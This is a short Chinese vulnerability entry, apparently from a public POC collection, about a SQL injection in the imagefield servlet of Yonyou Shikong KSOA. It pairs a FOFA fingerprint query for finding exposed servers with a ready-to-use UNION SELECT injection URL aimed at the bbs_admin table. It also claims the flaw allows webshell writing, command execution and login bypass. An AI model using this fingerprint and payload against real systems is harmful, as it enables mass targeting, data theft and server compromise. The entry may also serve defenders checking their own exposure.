## 用友时空KSOA-imagefield接口存在SQL注入漏洞

用友时空KSOA imagefield接口存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

## fofa
```
app="用友-时空KSOA"
```

## poc
```
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+

```

![c6b2b6d4ba7df38952d185d684c2e60a](https://github.com/wy876/POC/assets/139549762/ba1e8364-d789-480b-bbbb-e9ab0e067950)
